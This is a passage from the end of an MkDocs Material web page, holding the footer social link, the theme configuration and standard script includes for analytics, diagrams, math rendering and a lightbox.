5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://linkedin.com/in/armanriazi-github-io" target="_blank" rel="noopener" title="linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["search.suggest", "search.highlight", "search.share", "announce.dismiss", "content.tooltips", "content.code.copy", "content.tabs.link", "content.code.annotate", "header.autohide", "navigation.top", "navigation.instant", "navigation.footer", "navigation.indexes", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.path", "navigation.expand", "toc.follow", "toc.integrate"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
        <script src="../../../../docs/assets/javascripts/google-analytics.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  
<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>